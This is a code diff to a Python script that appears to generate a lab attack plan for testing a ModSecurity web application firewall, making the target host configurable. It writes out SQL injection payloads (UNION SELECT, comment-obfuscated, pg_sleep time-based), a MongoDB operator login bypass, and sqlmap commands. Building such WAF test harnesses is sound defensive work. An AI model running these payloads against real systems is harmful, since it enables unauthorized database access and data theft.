@@ -2,6 +2,7 @@
 import argparse
 import csv
 import json
+import os
 import re
 import subprocess
 import threading
@@ -33,6 +34,14 @@ PIN_SOURCE_CANDIDATES = [
         "four-digit-pin-codes-sorted-by-frequency-withcount.csv"
     ),
 ]
+
+HTTP_TARGET_BASE = os.environ.get("ATTACK_HTTP_BASE", "http://modsecurity:8080").rstrip(
+    "/"
+)
+
+
+def target_url(path: str) -> str:
+    return urllib.parse.urljoin(HTTP_TARGET_BASE + "/", path.lstrip("/"))
 
 
 @dataclass
@@ -467,10 +476,14 @@ def build_attack_plan(pin_wordlist: Optional[str]) -> List[Attack]:
     # basic: 直接 UNION SELECT
     # obfuscated: 利用注释混淆 S/*x*/E/*x*/L/*x*/E/*x*/C/*x*/T
     # stored procedure: 调用 pg_sleep 作为存储过程/函数调用示例
-    sqlmap_union_payload = "http://127.0.0.1:8081/pg/users?id=1%20UNION%20ALL%20SELECT%20NULL,current_database(),version()--"
-    sqlmap_time_payload = "http://127.0.0.1:8081/pg/users?id=1%20AND%209999=(SELECT%209999%20FROM%20PG_SLEEP(1.5))"
-    mongo_payload = "http://127.0.0.1:8081/mongo/login?username[$ne]=1&password[$ne]=1"
-    pg_baseline_payload = "http://127.0.0.1:8081/pg/users?id=1"
+    sqlmap_union_payload = target_url(
+        "pg/users?id=1%20UNION%20ALL%20SELECT%20NULL,current_database(),version()--"
+    )
+    sqlmap_time_payload = target_url(
+        "pg/users?id=1%20AND%209999=(SELECT%209999%20FROM%20PG_SLEEP(1.5))"
+    )
+    mongo_payload = target_url("mongo/login?username[$ne]=1&password[$ne]=1")
+    pg_baseline_payload = target_url("pg/users?id=1")
 
     brute_force_command: List[str]
     brute_force_notes: Optional[str] = None
@@ -519,7 +532,7 @@ def build_attack_plan(pin_wordlist: Optional[str]) -> List[Attack]:
                 "python3",
                 "/root/attack-scripts/raw_http_attack.py",
                 "--url",
-                "http://127.0.0.1:8081/pg/users",
+                target_url("pg/users"),
                 "--param",
                 "id=1 UNION ALL SELECT NULL,current_database(),version()--",
                 "--attack-id",
@@ -549,7 +562,7 @@ def build_attack_plan(pin_wordlist: Optional[str]) -> List[Attack]:
                 "python3",
                 "/root/attack-scripts/raw_http_attack.py",
                 "--url",
-                "http://127.0.0.1:8081/pg/users",
+                target_url("pg/users"),
                 "--param",
                 "id=1/**/UNION/**/ALL/**/SELECT/**/NULL,current_database(),version()--",
                 "--attack-id",
@@ -579,7 +592,7 @@ def build_attack_plan(pin_wordlist: Optional[str]) -> List[Attack]:
                 "python3",
                 "/root/attack-scripts/raw_http_attack.py",
                 "--url",
-                "http://127.0.0.1:8081/pg/users",
+                target_url("pg/users"),
                 "--param",
                 "id=1 AND 9999=(SELECT 9999 FROM pg_sleep(0.8))",
                 "--attack-id",
@@ -608,7 +621,7 @@ def build_attack_plan(pin_wordlist: Optional[str]) -> List[Attack]:
                 *BASE_EXEC,
                 "sqlmap",
                 "-u",
-                "http://127.0.0.1:8081/pg/users?id=1",
+                target_url("pg/users?id=1"),
                 "-p",
                 "id",
                 "--dbms=PostgreSQL",
@@ -638,7 +651,7 @@ def build_attack_plan(pin_wordlist: Optional[str]) -> List[Attack]:
                 *BASE_EXEC,
                 "sqlmap",
                 "-u",
-                "http://127.0.0.1:8081/pg/users?id=1",
+                target_url("pg/users?id=1"),
                 "-p",
                 "id",
                 "--dbms=PostgreSQL",
@@ -669,7 +682,7 @@ def build_attack_plan(pin_wordlist: Optional[str]) -> List[Attack]:
                 *BASE_EXEC,
                 "sqlmap",
                 "-u",
-                "http://127.0.0.1:8081/mongo/login?username=admin&password=foo",
+                target_url("mongo/login?username=admin&password=foo"),
                 "-p",
                 "username",
                 "--dbms=MongoDB",
